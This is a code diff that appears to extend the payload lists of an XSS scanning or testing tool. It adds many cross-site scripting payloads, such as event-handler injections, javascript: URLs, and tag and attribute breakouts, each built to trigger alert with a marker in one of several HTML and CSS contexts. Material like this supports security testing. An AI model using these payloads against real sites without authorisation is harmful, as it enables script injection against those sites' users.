@@ -32,6 +32,13 @@ HTML_BODY = [
     "<body onpageshow=alert('{marker}')>",
     "<audio src/onerror=alert('{marker}')>",
     "<video onloadstart=\"alert('{marker}')\"><source></video>",
+    "<select autofocus onfocus=alert('{marker}')>",
+    "<textarea autofocus onfocus=alert('{marker}')>",
+    "<object data=\"javascript:alert('{marker}')\">",
+    "<embed src=\"javascript:alert('{marker}')\">",
+    "<form><button autofocus onfocus=alert('{marker}')>x</button></form>",
+    "<picture><source srcset=x onerror=alert('{marker}')><img src=x></picture>",
+    "<link rel=stylesheet href=\"javascript:alert('{marker}')\">",
 ]
 
 ATTR_DOUBLE = [
@@ -39,10 +46,14 @@ ATTR_DOUBLE = [
     '"><svg onload=alert(\'{marker}\')>',
     '" onmouseover="alert(\'{marker}\')" x="',
     '" onfocus="alert(\'{marker}\')" autofocus="',
+    '" onclick="alert(\'{marker}\')" x="',
     '"><details open ontoggle=alert(\'{marker}\')>',
     '"><script>alert(\'{marker}\')</script>',
     '" style="expression(alert(\'{marker}\'))" x="',
     '"><meta http-equiv="refresh" content="0;url=javascript:alert(\'{marker}\')">',
+    '"><a href="javascript:alert(\'{marker}\')">x</a>',
+    '"><iframe src="javascript:alert(\'{marker}\')">',
+    '" onpointerover="alert(\'{marker}\')" x="',
     '"><svg><animate onbegin=alert(\'{marker}\') attributeName=x dur=1s>',
     '"><style>@keyframes x{{}}</style><xss style="animation-name:x" onanimationend="alert(\'{marker}\')"></xss>',
     '" oncontentvisibilityautostatechange="alert(\'{marker}\')" style="content-visibility:auto"',
@@ -52,9 +63,14 @@ ATTR_DOUBLE = [
 ATTR_SINGLE = [
     "'><img src=x onerror=alert('{marker}')>",
     "' onmouseover='alert(\"{marker}\")' x='",
+    "' onclick='alert(\"{marker}\")' x='",
     "'><svg onload=alert('{marker}')>",
     "' onfocus='alert(\"{marker}\")' autofocus='",
     "' style='expression(alert(\"{marker}\"))' x='",
+    "'><details open ontoggle=alert('{marker}')>",
+    "'><script>alert('{marker}')</script>",
+    "'><a href='javascript:alert(\"{marker}\")'>x</a>",
+    "' onpointerover='alert(\"{marker}\")' x='",
     "'><svg><animate onbegin=alert('{marker}') attributeName=x dur=1s>",
     "' oncontentvisibilityautostatechange='alert(\"{marker}\")' style='content-visibility:auto'",
     "'><xss onfocus=alert('{marker}') autofocus tabindex=1>",
@@ -62,9 +78,13 @@ ATTR_SINGLE = [
 
 ATTR_UNQUOTED = [
     " onmouseover=alert('{marker}') x=",
+    " onclick=alert('{marker}') x=",
     " onfocus=alert('{marker}') autofocus ",
     "/><img src=x onerror=alert('{marker}')>",
+    "/><svg onload=alert('{marker}')>",
+    "/><details open ontoggle=alert('{marker}')>",
     " style=expression(alert('{marker}')) ",
+    " onpointerover=alert('{marker}') x=",
     "/><svg><animate onbegin=alert('{marker}') attributeName=x dur=1s>",
     " oncontentvisibilityautostatechange=alert('{marker}') style=content-visibility:auto ",
 ]
@@ -82,6 +102,9 @@ TAG_NAME = [
     "script>alert('{marker}')</script",
     "details open ontoggle=alert('{marker}')",
     "input autofocus onfocus=alert('{marker}')",
+    "a href=\"javascript:alert('{marker}')\">x</a",
+    "iframe src=\"javascript:alert('{marker}')\"",
+    "body onload=alert('{marker}')",
 ]
 
 TEXTAREA = [
@@ -89,6 +112,9 @@ TEXTAREA = [
     "</textarea><svg onload=alert('{marker}')>",
     "</textarea><script>alert('{marker}')</script>",
     "</textarea><details open ontoggle=alert('{marker}')>",
+    "</textarea><input autofocus onfocus=alert('{marker}')>",
+    "</textarea><svg><animate onbegin=alert('{marker}') attributeName=x dur=1s>",
+    "</textarea><audio src/onerror=alert('{marker}')>",
 ]
 
 TITLE = [
@@ -96,6 +122,9 @@ TITLE = [
     "</title><svg onload=alert('{marker}')>",
     "</title><script>alert('{marker}')</script>",
     "</title><details open ontoggle=alert('{marker}')>",
+    "</title><input autofocus onfocus=alert('{marker}')>",
+    "</title><svg><animate onbegin=alert('{marker}') attributeName=x dur=1s>",
+    "</title><audio src/onerror=alert('{marker}')>",
 ]
 
 NOSCRIPT = [
@@ -103,14 +132,20 @@ NOSCRIPT = [
     "</noscript><svg onload=alert('{marker}')>",
     "</noscript><script>alert('{marker}')</script>",
     "</noscript><details open ontoggle=alert('{marker}')>",
+    "</noscript><input autofocus onfocus=alert('{marker}')>",
+    "</noscript><svg><animate onbegin=alert('{marker}') attributeName=x dur=1s>",
+    "</noscript><audio src/onerror=alert('{marker}')>",
 ]
 
 IFRAME_SRCDOC = [
     '"><script>alert(\'{marker}\')</script>',
     '"><img src=x onerror=alert(\'{marker}\')>',
     '"><svg onload=alert(\'{marker}\')>',
+    '"><details open ontoggle=alert(\'{marker}\')>',
     '<script>alert(\'{marker}\')</script>',
     '<img src=x onerror=alert(\'{marker}\')>',
+    '<svg onload=alert(\'{marker}\')>',
+    "javascript:alert('{marker}')",
 ]
 
 OBJECT_DATA = [
@@ -126,12 +161,18 @@ COMMENT = [
     "-->;<script>alert('{marker}')</script><!--",
     "--><img src=x onerror=alert('{marker}')><!--",
     "--><svg onload=alert('{marker}')><!--",
+    "--><details open ontoggle=alert('{marker}')><!--",
+    "--><input autofocus onfocus=alert('{marker}')><!--",
+    "--><svg><animate onbegin=alert('{marker}') attributeName=x dur=1s><!--",
 ]
 
 CSS = [
     "expression(alert('{marker}'))",
     "</style><script>alert('{marker}')</script>",
     "</style><img src=x onerror=alert('{marker}')>",
+    "</style><svg onload=alert('{marker}')>",
+    "</style><details open ontoggle=alert('{marker}')>",
+    "</style><input autofocus onfocus=alert('{marker}')>",
 ]
 
 CSS_VALUE = [
@@ -140,4 +181,6 @@ CSS_VALUE = [
     "}}</style><script>alert('{marker}')</script>",
     "expression(alert('{marker}'))",
     "}}</style><svg onload=alert('{marker}')>",
+    "}}</style><details open ontoggle=alert('{marker}')>",
+    "}}</style><input autofocus onfocus=alert('{marker}')>",
 ]
